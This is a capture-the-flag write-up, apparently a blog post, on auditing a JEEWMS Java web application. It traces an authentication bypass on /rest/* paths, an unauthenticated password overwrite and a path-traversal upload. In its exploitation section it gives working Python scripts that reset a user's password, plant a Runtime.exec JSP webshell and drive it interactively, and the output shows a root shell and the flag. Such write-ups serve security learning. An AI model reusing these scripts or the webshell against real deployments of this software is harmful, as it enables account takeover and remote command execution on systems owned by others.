---
title: "CTFWEB 199.193.127.177:8081"
description: "A code-audit retrospective of a JEEWMS Java Web challenge."
publishDate: "2026-08-10T20:22:37"
tags:
  - "ctf"
  - "web"
heroImage:
  src: ../../blog/ctfweb-jeewms-java-audit/domino-girl.jpg
  color: "#637EA2"
  alt: CTFWEB 199.193.127.177:8081
language: 'en'
draft: false
---

> A tough Java code-auditing challenge set by a senior student, presented as a zero-day challenge with the vulnerability left for us to find.
>
> **Project stats**
>
> - **Directories:** 1226
> - **Files:** 6281
>
> **Code stats**
>
> | Language                   | Files    | Blank      | Comment    | Code        |
> | -------------------------- | -------- | ---------- | ---------- | ----------- |
> | JavaScript                 | 1652     | 145505     | 183204     | 886541      |
> | CSS                        | 530      | 10138      | 5552       | 373051      |
> | JSP                        | 412      | 5306       | 4607       | 47636       |
> | JSON                       | 65       | 7          | 0          | 46321       |
> | Freemarker Template        | 124      | 1400       | 1348       | 31539       |
> | SVG                        | 274      | 5          | 11         | 24711       |
> | LESS                       | 163      | 6142       | 2480       | 24455       |
> | HTML                       | 40       | 211        | 1012       | 3776        |
> | Velocity Template Language | 18       | 32         | 6          | 3008        |
> | JSP Tag Library Definition | 1        | 17         | 69         | 1700        |
> | Maven                      | 1        | 36         | 173        | 865         |
> | XML                        | 20       | 60         | 110        | 841         |
> | SCSS                       | 18       | 103        | 32         | 472         |
> | Text                       | 5        | 12         | 0          | 303         |
> | Properties                 | 10       | 139        | 248        | 207         |
> | SQL                        | 16       | 2          | 0          | 153         |
> | Markdown                   | 6        | 62         | 0          | 144         |
> | Python                     | 1        | 14         | 9          | 57          |
> | PHP                        | 2        | 9          | 10         | 24          |
> | Ruby                       | 1        | 1          | 2          | 11          |
> | **SUM**                    | **3359** | **169201** | **198873** | **1445815** |
>
> I tried hard and eventually gave up. My Java knowledge was practically nonexistent—which made sense, since I hadn't studied it. During the post-event review, I gave the project to DeepSeek Pro with its highest reasoning setting and a 1M-token context window. It found the chain below and even worked out the password. My senior pointed out that this was a roundabout solution: knowing that `/rest/*` bypasses the authentication filter, you can call the upload endpoint anonymously to write a zip containing a JSP, then use the unzip endpoint's controllable extraction path to place it where Tomcat can execute it. Cracking the password after already finding the `/rest/*` bypass was an unnecessary detour. The model also claimed the chain could be worked out by hand from scratch—really? 😭 Clearly I need to learn Java. Its detailed analysis follows:

## Deep analysis

I got a 138MB WAR package containing 800+ class files, 400+ JSPs, and 27 jar packages. Trying to read all the code line by line before acting would take more than a day.

So the first thing after unpacking, open `WEB-INF/web.xml`. There's no need to read the whole thing; go straight to:

```text
1. <servlet> 和 <servlet-mapping> — 哪些 URL 模式被映射？有几个 Servlet？
2. <filter> 和 <filter-mapping> — 过滤器链的顺序？
3. <listener> — 启动时做了什么？
4. <session-config> — session 超时多长？
```

Notice:

```xml
<!-- 主 Servlet -->
<servlet-mapping>
    <servlet-name>springMvc</servlet-name>
    <url-pattern>*.do</url-pattern>
    <url-pattern>*.action</url-pattern>
</servlet-mapping>

<!-- REST Servlet -->
<servlet-mapping>
    <servlet-name>restSpringMvc</servlet-name>
    <url-pattern>/rest/*</url-pattern>
</servlet-mapping>
```

Two DispatcherServlets, and their `contextConfigLocation` points to the same `spring-mvc.xml`.

Then look at authentication: open `spring-mvc.xml` and go straight to the `<mvc:interceptors>` section:

```xml
<mvc:interceptors>
    <!-- 编码拦截器 — 所有路径 -->
    <!-- Sign 拦截器 — /api/** -->
    <!-- ★ AuthInterceptor — 所有路径，带白名单 -->
    <!-- WmsApiInterceptor — 特定 WMS API 方法 -->
</mvc:interceptors>
```

Looking at the whitelist:

```xml
<property name="excludeUrls">
    <list>
        <value>loginController.do?checkuser</value>
        <value>loginController.do?login</value>
        <value>loginController.do?changeDefaultOrg</value>
        <value>rest/tokens/login</value>
        <value>rest/wmToDownGoodsController</value>
        <value>rest/wvStockController</value>
        <!-- ... -->
    </list>
</property>
<property name="excludeContainUrls">
    <list>
        <value>wmsApiController.do</value>  <!-- 整个 Controller 放行！ -->
    </list>
</property>
```

But this is just a declaration in the config file. The logic that actually takes effect is in the decompiled Java code, so decompile `AuthInterceptor` and look at the `preHandle()` method:

```java
public boolean preHandle(HttpServletRequest request, ...) {
    String requestPath = ResourceUtil.getRequestPath(request);

    // ★ 第 87 行 — 正则直接放行 rest 路径
    if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$")) {
        return true;
    }

    // 精确白名单
    if (this.excludeUrls.contains(requestPath)) { return true; }
    // 包含白名单
    if (this.moHuContain(this.excludeContainUrls, requestPath)) { return true; }

    // 下面才是 session 校验...
    Client client = ClientManager.getInstance().getClient(session.getId());
    ...
}
```

The early `return true` is the key: a `requestPath` matching the REST-path regex reaches it before the session check. A query string containing `?` prevents that regex from matching.

But what exactly is `requestPath`? Trace `getRequestPath()`:

```java
// ResourceUtil.java:89-100
public static String getRequestPath(HttpServletRequest request) {
    String queryString = request.getQueryString();  // URL 中 ? 后的部分
    String requestPath = request.getRequestURI();   // /jeewms/rest/xxx

    if (StringUtils.isNotEmpty(queryString)) {
        requestPath = requestPath + "?" + queryString;
    }
    // 截断到第一个 &
    if (requestPath.indexOf("&") > -1) {
        requestPath = requestPath.substring(0, requestPath.indexOf("&"));
    }
    requestPath = requestPath.substring(request.getContextPath().length() + 1);
    return requestPath;
}
```

Now we can draw a precise authentication-boundary table:

| HTTP request                         | queryString | requestPath                 | regex match? | auth required? |
| ------------------------------------ | ----------- | --------------------------- | ------------ | -------------- |
| `GET /rest/user`                     | null        | `rest/user`                 | ✅          | ❌ bypassed    |
| `PUT /rest/user/abc`                 | null        | `rest/user/abc`             | ✅          | ❌ bypassed    |
| `POST /rest/user` (JSON body)        | null        | `rest/user`                 | ✅          | ❌ bypassed    |
| `GET /rest/user?id=1`                | `id=1`      | `rest/user?id=1`            | ❌          | ✅ required    |
| `PUT /rest/tokens/saveImage?a=1&b=2` | `a=1&b=2`   | `rest/tokens/saveImage?a=1` | ❌          | ✅ required    |

For the paths above, requests without query parameters match the REST-path regex and bypass this session check. Adding a query string prevents that particular bypass. The remaining exclusion rules must still be considered; this table describes the routes used in the chain below.

With the authentication boundary drawn clearly, the next step is to find endpoints that can cause real harm — just grep:

```bash
# 优先级 1: 用户管理和密码
grep -rn 'TSUser\|password\|saveOrUpdate\|createUser\|changePassword'

# 优先级 2: 文件写入
grep -rn 'FileOutputStream\|MultipartFile\|getInputStream\|FileCopyUtils'

# 优先级 3: 命令执行
grep -rn 'Runtime.exec\|ProcessBuilder\|getRuntime()'

# 优先级 4: SQL 拼接（找注入点）
grep -rn 'createSQLQuery\|findListbySql\|executeSql'
```

The reason for the priority ordering:

1. Being able to change a password = being able to log in = being able to get a session — this is the springboard for upgrading "unauthorized" to "authenticated".
2. Being able to write files = being able to write a webshell = command execution — this is the final goal.
3. Command execution = getting the flag directly — if you can RCE directly, you don't need the first two steps.
4. SQL injection = being able to read the database = possibly reading the flag or other credentials — a backup plan.

Once the grep results are in, check them one by one. `UserRestController` jumps out first — open it and take a look:

```java
@Controller
@RequestMapping(value = {"/user"})
public class UserRestController {

    @RequestMapping(method = {RequestMethod.PUT}, consumes = {"application/json"})
    public ResponseEntity<?> update(@RequestBody TSUser user) {
        this.userService.saveOrUpdate(user);  // ← 直接更新，无任何鉴权
        return new ResponseEntity(HttpStatus.NO_CONTENT);
    }
}
```

No `@PreAuthorize` on the class, no session check on the method, and the parameter binds JSON directly with `@RequestBody`. Combined with the conclusion from Step 2 — the PUT request's body is in JSON and the URL has no `?` → requestPath matches the regex → accessible without authorization.

Now check file writing. `TokenController.saveImage` jumps out:

```java
String fileName = request.getParameter("imageFileName");  // 无校验
String fileAddr = request.getParameter("fileAddr");
// ...
fileAddr = f.getCanonicalPath();  // 只规范化了目录部分
// 然后：
new FileOutputStream(fileAddr + File.separator + fileName);  // fileName 未经任何处理！
```

Immediately recognize the path-traversal pattern: `getCanonicalPath()` + unfiltered fileName → `../` is usable.

After finding two vulnerabilities, simulate the attack chain:

```text
PUT /rest/user/{id}     → 改密码    → 需要什么？只需要 user_id
loginController.do      → 登录      → 需要什么？新密码
PUT /rest/tokens/saveImage → 写 shell → 需要什么？JSESSIONID
GET /shell.jsp           → 执行命令  → 需要什么？shell 已存在
```

Check the sticking points:

Changing the password requires knowing the password encryption method. Trace `PasswordUtil`:

```text
// 发现是 PBEWithMD5AndDES，静态盐 "63293188"
// → 可以自己实现加密算法，算出新密码的密文
// → Google: "PBEWithMD5AndDES key derivation MD5 1000 iterations"
// → 写出 Python 复现
```

Once this sticking point is cleared, the whole chain is complete.

This particular chain relies on three pieces working together:

| If missing…                        | What happens                                                                 |
| ---------------------------------- | ---------------------------------------------------------------------------- |
| ① REST regex bypass           | PUT /rest/user is blocked by AuthInterceptor → can't change the password     |
| ② Known password algorithm  | Password changed but the encrypted value can't be computed → login fails     |
| ③ saveImage path traversal    | Have a session but can't write the shell → can only operate WMS business data |

Code auditing gives a static view, but exploitation also depends on the deployment environment. The configuration files offer initial clues, and a subsequent error response reveals which assumptions hold on the actual target:

```properties
# sysConfig.properties
webUploadpath=C://upFiles
office_home=D://OpenOffice
```

`C://`, `D://` — Windows path format. But from the subsequent error echo:

```text
/usr/local/tomcat/C:/upFiles/test.txt (No such file or directory)
```

The path starts with `/usr/local/tomcat/` — this is actually a Linux server, and `C:` was treated as an ordinary directory name!

From this, deduce Tomcat's location and the number of traversal levels:

```text
webapps 目录:  /usr/local/tomcat/webapps/
upFiles 目录:  /usr/local/tomcat/C:/upFiles/
穿越:         从 upFiles → C: → tomcat → webapps = 3 层 ../
payload:      ../../../webapps/jeewms/shell.jsp
```

With that, the deep-dive exploit chain analysis is complete; now on to the exploitation.

## Exploitation

Here a GET request to `/jeewms/rest/user` satisfies the pass condition and directly returns all users, one of which is:

```json
[{"id":"2c9380839fd5a9d5019fd5e98bd60029","userName":"ctfuser_000279ixle","realName":"CTF User","browser":null,"userKey":null,"password":"0f514e9b48d2184ca21dc9e3dd2a2d68004fbedb91e71924","activitiSync":0,"status":1,"deleteFlag":0,"signature":null,"departid":null,"currentDepart":{"id":null,"departname":null,"description":null,"orgCode":null,"orgType":null,"mobile":null,"fax":null,"address":null,"departOrder":null,"tsdeparts":[],"tspdepart":null},"signatureFile":null,"mobilePhone":null,"officePhone":null,"email":null,"userType":null,"createDate":null,"createBy":null,"createName":null,"updateDate":null,"updateBy":null,"updateName":null}
```

Then a PUT with the id satisfies the pass condition and can directly update the password stored in the database.

And the encryption method is hardcoded and known:

```java
public class PasswordUtil {
    public static final String ALGORITHM = "PBEWithMD5AndDES";
    public static final String Salt = "63293188";
    private static final int ITERATIONCOUNT = 1000;
```

So here we can directly change the encrypted password in the database to one we design ourselves.

Handcrafting it:

### pwd.py

```python
import requests
import hashlib
from Crypto.Cipher import DES

def jeecg_password_hash(username, password):
    salt = b"63293188"
    iterations = 1000

    digest = hashlib.md5(password.encode() + salt).digest()
    for _ in range(iterations - 1):
        digest = hashlib.md5(digest).digest()

    key = digest[:8]
    iv = digest[8:16]

    data = username.encode()
    pad_len = 8 - len(data) % 8
    data += bytes([pad_len]) * pad_len

    cipher = DES.new(key, DES.MODE_CBC, iv)
    return cipher.encrypt(data).hex()

user_id = "2c9380839fd5a9d5019fd5e98bd60029"
username = "ctfuser_000279ixle"
new_password = "Resi123456"

password_hash = jeecg_password_hash(username, new_password)

s = requests.Session()

url = "http://199.193.127.177:8081/jeewms"
pwd = "Resi123456"
payload = {
    "id": user_id,
    "userName": username,
    "realName": "CTF User",
    "password": password_hash,
    "activitiSync": 0,
    "status": 1,
    "deleteFlag": 0
}

r = requests.put(f"{url}/rest/user/x", json=payload, timeout=10)

print(r.status_code)
print(r.text)
```

Now the password has been changed to `Resi123456`; log in directly.

Got the `JSESSIONID` (incredible...):

```http
Cookie: JSESSIONID=C2106CC68EAF418328F677C77CF86FE5; JEECGINDEXSTYLE=ace; ZINDEXNUMBER=1990
```

And since we saw earlier that the `../` in `fileName` at `saveImage` isn't normalized and there's no extension validation, we can directly use path traversal to write the shell.

### jsp.py

```python
import requests

target = "http://199.193.127.177:8081/jeewms"

s = requests.Session()

s.cookies.set("JSESSIONID", "55CA42F6779C75BC691C85112C80D119")
s.cookies.set("JEECGINDEXSTYLE", "ace")
s.cookies.set("ZINDEXNUMBER", "1990")

shell_body = b'''<% 
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    java.io.InputStream in = p.getInputStream();
    int c;
    while ((c = in.read()) != -1) out.write(c);
%>'''

url = f"{target}/rest/tokens/saveImage?imageFileName=../../../webapps/jeewms/shell.jsp&fileAddr=x"

r = requests.put(url, data=shell_body, cookies=s.cookies,
                  headers={"Content-Type": "application/octet-stream"})

print(r.status_code)
print(r.text)
```

### shell.py

```python
import requests

target = "http://199.193.127.177:8081/jeewms"

s = requests.Session()

while True:
    cmd = input("$ ")
    if cmd == "exit":
        break
    r = requests.get(f"{target}/shell.jsp", params={"cmd": cmd})
    print(r.text)
```

Then get a shell — directly as the root user.

```text
(venv) resi@MacBook-Air 脚本 % python shell.py
$ id
uid=0(root) gid=0(root) groups=0(root)

$ ls /
8cf4d099675b
bin
boot
__cacert_entrypoint.sh
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ ls /8cf4d099675b
flag_5c3411c3

$ cat /8cf4d099675b/flag_5c3411c3
flag{we1c0me_t0_jeewm5_she1l_pwn!}
```

## Flag

```text
flag{we1c0me_t0_jeewm5_she1l_pwn!}
```